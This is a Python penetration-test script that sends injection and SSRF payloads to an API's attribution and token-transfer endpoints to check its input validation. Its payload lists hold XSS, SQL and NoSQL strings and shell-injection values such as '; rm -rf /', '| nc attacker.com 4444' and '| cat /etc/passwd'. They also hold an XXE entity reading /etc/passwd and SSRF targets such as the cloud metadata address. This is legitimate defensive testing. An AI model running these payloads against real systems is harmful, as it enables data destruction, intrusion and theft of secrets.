"""
Input Validation Penetration Test

Tests for:
- XSS (Cross-Site Scripting) in context fields
- SQL injection in queries
- NoSQL injection
- Command injection
- LDAP injection
- XML/XXE injection
- JSON injection
- SSRF (Server-Side Request Forgery)
"""

import asyncio
from typing import Dict, List

import httpx


class InputValidationTests:
    """Penetration tests for input validation vulnerabilities"""

    def __init__(self, base_url: str = "http://localhost:8000", api_key: str = None):
        self.base_url = base_url
        self.api_key = api_key
        self.results: List[Dict] = []

    async def test_xss_in_context_fields(self) -> Dict:
        """Test for XSS vulnerabilities in context and description fields"""
        print("\n[TEST] XSS in Context Fields")

        if not self.api_key:
            print("  ⚠️  SKIPPED: No API key provided")
            return {"test": "xss_context", "status": "SKIPPED"}

        headers = {"Authorization": f"Bearer {self.api_key}"}
        endpoint = "/attributions"

        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "'-alert('XSS')-'",
            "\"><script>alert('XSS')</script>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
        ]

        vulnerable = []

        async with httpx.AsyncClient() as client:
            for payload in xss_payloads:
                try:
                    data = {
                        "source_card_id": "550e8400-e29b-41d4-a716-446655440000",
                        "target_card_id": "660e8400-e29b-41d4-a716-446655440001",
                        "attribution_type": "citation",
                        "user_id": "770e8400-e29b-41d4-a716-446655440002",
                        "context": payload,
                        "excerpt": payload,
                    }

                    response = await client.post(f"{self.base_url}{endpoint}", headers=headers, json=data)

                    if response.status_code in [200, 201]:
                        # Check if payload is reflected without sanitization
                        try:
                            response_data = response.json()
                            if payload in str(response_data):
                                vulnerable.append(payload[:50])
                                print(f"  ❌ VULNERABLE: XSS payload reflected: {payload[:50]}")
                            else:
                                print(f"  ✅ SECURE: XSS payload sanitized")
                        except:
                            print(f"  ✅ SECURE: Response parsing failed (likely sanitized)")
                    else:
                        print(f"  ✅ SECURE: Payload rejected")

                except Exception as e:
                    print(f"  ⚠️  ERROR: {str(e)}")

        result = {
            "test": "xss_context_fields",
            "status": "FAIL" if vulnerable else "PASS",
            "vulnerable_payloads": vulnerable,
            "severity": "HIGH" if vulnerable else "N/A",
        }
        self.results.append(result)
        return result

    async def test_sql_injection_in_queries(self) -> Dict:
        """Test for SQL injection in query parameters"""
        print("\n[TEST] SQL Injection in Queries")

        if not self.api_key:
            print("  ⚠️  SKIPPED: No API key provided")
            return {"test": "sql_injection_queries", "status": "SKIPPED"}

        headers = {"Authorization": f"Bearer {self.api_key}"}

        sql_injection_attempts = [
            "/tokens/balance/550e8400-e29b-41d4-a716-446655440000' OR '1'='1",
            "/tokens/balance/550e8400-e29b-41d4-a716-446655440000'; DROP TABLE users;--",
            "/tokens/balance/550e8400-e29b-41d4-a716-446655440000' UNION SELECT NULL--",
            "/attributions/550e8400' OR 1=1--",
            "/tokens/ledger/550e8400?limit=10' OR '1'='1",
            "/tokens/stats/550e8400') OR ('1'='1",
        ]

        vulnerable = []

        async with httpx.AsyncClient() as client:
            for url in sql_injection_attempts:
                try:
                    response = await client.get(f"{self.base_url}{url}", headers=headers)

                    # 500 errors might indicate SQL injection
                    if response.status_code == 500:
                        vulnerable.append(url[:50])
                        print(f"  ❌ VULNERABLE: SQL error on {url[:50]}")
                    elif response.status_code == 200:
                        # Check for SQL error messages in response
                        try:
                            text = response.text.lower()
                            sql_errors = ["sql", "syntax error", "mysql", "postgresql", "sqlite"]
                            if any(err in text for err in sql_errors):
                                vulnerable.append(url[:50])
                                print(f"  ❌ VULNERABLE: SQL error leaked in response")
                            else:
                                print(f"  ✅ SECURE: No SQL injection")
                        except:
                            print(f"  ✅ SECURE: No SQL injection")
                    else:
                        print(f"  ✅ SECURE: Request rejected or not found")

                except Exception as e:
                    error_str = str(e).lower()
                    if "sql" in error_str or "database" in error_str:
                        vulnerable.append(url[:50])
                        print(f"  ❌ VULNERABLE: SQL error in exception: {str(e)[:50]}")
                    else:
                        print(f"  ✅ SECURE: Request failed safely")

        result = {
            "test": "sql_injection_queries",
            "status": "FAIL" if vulnerable else "PASS",
            "vulnerable_urls": vulnerable,
            "severity": "CRITICAL" if vulnerable else "N/A",
        }
        self.results.append(result)
        return result

    async def test_nosql_injection(self) -> Dict:
        """Test for NoSQL injection vulnerabilities"""
        print("\n[TEST] NoSQL Injection")

        if not self.api_key:
            print("  ⚠️  SKIPPED: No API key provided")
            return {"test": "nosql_injection", "status": "SKIPPED"}

        headers = {"Authorization": f"Bearer {self.api_key}"}
        endpoint = "/tokens/transfer"

        nosql_payloads = [
            {
                "from_user_id": {"$ne": None},
                "to_user_id": "660e8400-e29b-41d4-a716-446655440001",
                "amount": "10.00",
                "reason": "NoSQL test",
            },
            {
                "from_user_id": "550e8400-e29b-41d4-a716-446655440000",
                "to_user_id": {"$gt": ""},
                "amount": "10.00",
                "reason": "NoSQL test",
            },
            {
                "from_user_id": "550e8400-e29b-41d4-a716-446655440000",
                "to_user_id": "660e8400-e29b-41d4-a716-446655440001",
                "amount": {"$regex": ".*"},
                "reason": "NoSQL test",
            },
        ]

        vulnerable = []

        async with httpx.AsyncClient() as client:
            for payload in nosql_payloads:
                try:
                    response = await client.post(
                        f"{self.base_url}{endpoint}", headers=headers, json=payload
                    )

                    if response.status_code in [200, 201]:
                        vulnerable.append(str(payload)[:50])
                        print(f"  ❌ VULNERABLE: NoSQL injection accepted")
                    elif response.status_code in [400, 422]:
                        print(f"  ✅ SECURE: NoSQL injection rejected")
                    else:
                        print(f"  ⚠️  UNEXPECTED: Status {response.status_code}")

                except Exception as e:
                    print(f"  ⚠️  ERROR: {str(e)}")

        result = {
            "test": "nosql_injection",
            "status": "FAIL" if vulnerable else "PASS",
            "vulnerable_payloads": vulnerable,
            "severity": "CRITICAL" if vulnerable else "N/A",
        }
        self.results.append(result)
        return result

    async def test_command_injection(self) -> Dict:
        """Test for command injection vulnerabilities"""
        print("\n[TEST] Command Injection")

        if not self.api_key:
            print("  ⚠️  SKIPPED: No API key provided")
            return {"test": "command_injection", "status": "SKIPPED"}

        headers = {"Authorization": f"Bearer {self.api_key}"}
        endpoint = "/attributions"

        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "`whoami`",
            "$(whoami)",
            "&& id",
            "; rm -rf /",
            "| nc attacker.com 4444",
            "; curl http://attacker.com",
            "\n/bin/bash -i",
        ]

        vulnerable = []

        async with httpx.AsyncClient() as client:
            for payload in command_injection_payloads:
                try:
                    data = {
                        "source_card_id": "550e8400-e29b-41d4-a716-446655440000",
                        "target_card_id": "660e8400-e29b-41d4-a716-446655440001",
                        "attribution_type": "citation",
                        "user_id": "770e8400-e29b-41d4-a716-446655440002",
                        "context": payload,
                        "reason": payload,
                    }

                    response = await client.post(f"{self.base_url}{endpoint}", headers=headers, json=data)

                    # Check for command execution indicators
                    if response.status_code == 500:
                        vulnerable.append(payload[:30])
                        print(f"  ❌ VULNERABLE: Server error with command: {payload[:30]}")
                    elif response.status_code in [200, 201]:
                        # Check if command output is in response
                        try:
                            text = response.text
                            indicators = ["root:", "bin/bash", "uid=", "gid="]
                            if any(ind in text for ind in indicators):
                                vulnerable.append(payload[:30])
                                print(f"  ❌ CRITICAL: Command executed! {payload[:30]}")
                            else:
                                print(f"  ✅ SECURE: No command execution")
                        except:
                            print(f"  ✅ SECURE: No command execution")
                    else:
                        print(f"  ✅ SECURE: Request rejected")

                except Exception as e:
                    print(f"  ⚠️  ERROR: {str(e)}")

        result = {
            "test": "command_injection",
            "status": "FAIL" if vulnerable else "PASS",
            "vulnerable_payloads": vulnerable,
            "severity": "CRITICAL" if vulnerable else "N/A",
        }
        self.results.append(result)
        return result

    async def test_xxe_injection(self) -> Dict:
        """Test for XML External Entity (XXE) injection"""
        print("\n[TEST] XXE Injection")

        if not self.api_key:
            print("  ⚠️  SKIPPED: No API key provided")
            return {"test": "xxe_injection", "status": "SKIPPED"}

        headers = {
            "Authorization": f"Bearer {self.api_key}",
            "Content-Type": "application/xml",
        }
        endpoint = "/attributions"

        xxe_payloads = [
            """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<attribution><context>&xxe;</context></attribution>""",
            """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/malicious">]>
<attribution><context>&xxe;</context></attribution>""",
        ]

        vulnerable = []

        async with httpx.AsyncClient() as client:
            for payload in xxe_payloads:
                try:
                    response = await client.post(
                        f"{self.base_url}{endpoint}", headers=headers, content=payload
                    )

                    if response.status_code in [200, 201]:
                        # Check if file content is in response
                        try:
                            text = response.text
                            if "root:" in text or "bin/bash" in text:
                                vulnerable.append("XXE file read")
                                print(f"  ❌ CRITICAL: XXE vulnerability - file read successful!")
                            else:
                                print(f"  ✅ SECURE: XXE not exploited")
                        except:
                            print(f"  ✅ SECURE: XXE not exploited")
                    else:
                        print(f"  ✅ SECURE: XML request rejected")

                except Exception as e:
                    print(f"  ⚠️  ERROR: {str(e)}")

        result = {
            "test": "xxe_injection",
            "status": "FAIL" if vulnerable else "PASS",
            "vulnerable_scenarios": vulnerable,
            "severity": "CRITICAL" if vulnerable else "N/A",
        }
        self.results.append(result)
        return result

    async def test_ssrf(self) -> Dict:
        """Test for Server-Side Request Forgery (SSRF)"""
        print("\n[TEST] SSRF (Server-Side Request Forgery)")

        if not self.api_key:
            print("  ⚠️  SKIPPED: No API key provided")
            return {"test": "ssrf", "status": "SKIPPED"}

        headers = {"Authorization": f"Bearer {self.api_key}"}
        endpoint = "/attributions"

        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://localhost:22",  # Internal SSH
            "http://127.0.0.1:6379",  # Internal Redis
            "http://0.0.0.0:5432",  # Internal PostgreSQL
            "file:///etc/passwd",  # Local file
            "http://[::]:80/",  # IPv6 localhost
            "http://2130706433/",  # IP as decimal
        ]

        vulnerable = []

        async with httpx.AsyncClient() as client:
            for payload in ssrf_payloads:
                try:
                    data = {
                        "source_card_id": "550e8400-e29b-41d4-a716-446655440000",
                        "target_card_id": "660e8400-e29b-41d4-a716-446655440001",
                        "attribution_type": "citation",
                        "user_id": "770e8400-e29b-41d4-a716-446655440002",
                        "context": payload,
                        "metadata": {"url": payload},
                    }

                    response = await client.post(f"{self.base_url}{endpoint}", headers=headers, json=data)

                    # Check for SSRF indicators
                    if response.status_code in [200, 201]:
                        try:
                            text = response.text.lower()
                            ssrf_indicators = ["ami-id", "instance-id", "redis", "postgresql", "ssh"]
                            if any(ind in text for ind in ssrf_indicators):
                                vulnerable.append(payload)
                                print(f"  ❌ CRITICAL: SSRF vulnerability! {payload}")
                            else:
                                print(f"  ✅ SECURE: No SSRF")
                        except:
                            print(f"  ✅ SECURE: No SSRF")
                    else:
                        print(f"  ✅ SECURE: Request rejected")

                except Exception as e:
                    print(f"  ⚠️  ERROR: {str(e)}")

        result = {
            "test": "ssrf",
            "status": "FAIL" if vulnerable else "PASS",
            "vulnerable_payloads": vulnerable,
            "severity": "CRITICAL" if vulnerable else "N/A",
        }
        self.results.append(result)
        return result

    async def test_json_injection(self) -> Dict:
        """Test for JSON injection vulnerabilities"""
        print("\n[TEST] JSON Injection")

        if not self.api_key:
            print("  ⚠️  SKIPPED: No API key provided")
            return {"test": "json_injection", "status": "SKIPPED"}

        headers = {"Authorization": f"Bearer {self.api_key}"}
        endpoint = "/tokens/transfer"

        # Malformed JSON attempts
        json_injection_payloads = [
            '{"from_user_id":"550e8400-e29b-41d4-a716-446655440000","to_user_id":"660e8400-e29b-41d4-a716-446655440001","amount":"10.00","reason":"test"}{"admin":true}',
            '{"from_user_id":"550e8400-e29b-41d4-a716-446655440000","to_user_id":"660e8400-e29b-41d4-a716-446655440001","amount":"10.00\\"},{\\"admin\\":\\"true","reason":"test"}',
        ]

        vulnerable = []

        async with httpx.AsyncClient() as client:
            for payload in json_injection_payloads:
                try:
                    response = await client.post(
                        f"{self.base_url}{endpoint}",
                        headers=headers,
                        content=payload,
                    )

                    if response.status_code in [200, 201]:
                        vulnerable.append(payload[:50])
                        print(f"  ❌ VULNERABLE: Malformed JSON accepted")
                    elif response.status_code in [400, 422]:
                        print(f"  ✅ SECURE: Malformed JSON rejected")
                    else:
                        print(f"  ⚠️  UNEXPECTED: Status {response.status_code}")

                except Exception as e:
                    print(f"  ✅ SECURE: JSON parsing failed")

        result = {
            "test": "json_injection",
            "status": "FAIL" if vulnerable else "PASS",
            "vulnerable_payloads": vulnerable,
            "severity": "MEDIUM" if vulnerable else "N/A",
        }
        self.results.append(result)
        return result

    async def test_unicode_bypass(self) -> Dict:
        """Test for Unicode normalization bypass"""
        print("\n[TEST] Unicode Normalization Bypass")

        if not self.api_key:
            print("  ⚠️  SKIPPED: No API key provided")
            return {"test": "unicode_bypass", "status": "SKIPPED"}

        headers = {"Authorization": f"Bearer {self.api_key}"}
        endpoint = "/attributions"

        unicode_payloads = [
            "＜script＞alert('XSS')＜/script＞",  # Fullwidth characters
            "​<script>alert('XSS')</script>",  # Zero-width space
            "<scr\u0130pt>alert('XSS')</scr\u0130pt>",  # Turkish I
            "jаvascript:alert('XSS')",  # Cyrillic 'а'
            "<img src=x onerror=аlert('XSS')>",  # Cyrillic characters
        ]

        vulnerable = []

        async with httpx.AsyncClient() as client:
            for payload in unicode_payloads:
                try:
                    data = {
                        "source_card_id": "550e8400-e29b-41d4-a716-446655440000",
                        "target_card_id": "660e8400-e29b-41d4-a716-446655440001",
                        "attribution_type": "citation",
                        "user_id": "770e8400-e29b-41d4-a716-446655440002",
                        "context": payload,
                    }

                    response = await client.post(f"{self.base_url}{endpoint}", headers=headers, json=data)

                    if response.status_code in [200, 201]:
                        try:
                            response_data = response.json()
                            if "script" in str(response_data).lower():
                                vulnerable.append(payload[:30])
                                print(f"  ❌ VULNERABLE: Unicode bypass: {payload[:30]}")
                            else:
                                print(f"  ✅ SECURE: Unicode properly handled")
                        except:
                            print(f"  ✅ SECURE: Response parsing failed")
                    else:
                        print(f"  ✅ SECURE: Request rejected")

                except Exception as e:
                    print(f"  ⚠️  ERROR: {str(e)}")

        result = {
            "test": "unicode_bypass",
            "status": "FAIL" if vulnerable else "PASS",
            "vulnerable_payloads": vulnerable,
            "severity": "HIGH" if vulnerable else "N/A",
        }
        self.results.append(result)
        return result

    async def run_all_tests(self) -> Dict:
        """Run all input validation tests"""
        print("\n" + "=" * 60)
        print("INPUT VALIDATION PENETRATION TESTS")
        print("=" * 60)

        if not self.api_key:
            print("\n⚠️  WARNING: No API key provided. All tests will be skipped.")
            print("Usage: python 05_input_validation.py <base_url> <api_key>")

        await self.test_xss_in_context_fields()
        await self.test_sql_injection_in_queries()
        await self.test_nosql_injection()
        await self.test_command_injection()
        await self.test_xxe_injection()
        await self.test_ssrf()
        await self.test_json_injection()
        await self.test_unicode_bypass()

        # Summary
        passed = sum(1 for r in self.results if r["status"] == "PASS")
        failed = sum(1 for r in self.results if r["status"] == "FAIL")
        skipped = sum(1 for r in self.results if r["status"] == "SKIPPED")

        print("\n" + "=" * 60)
        print(f"RESULTS: {passed} PASSED, {failed} FAILED, {skipped} SKIPPED")
        print("=" * 60)

        return {
            "total_tests": len(self.results),
            "passed": passed,
            "failed": failed,
            "skipped": skipped,
            "details": self.results,
        }


if __name__ == "__main__":
    import sys

    base_url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000"
    api_key = sys.argv[2] if len(sys.argv) > 2 else None

    tester = InputValidationTests(base_url, api_key)
    results = asyncio.run(tester.run_all_tests())

    # Exit with non-zero code if any tests failed
    sys.exit(0 if results["failed"] == 0 else 1)
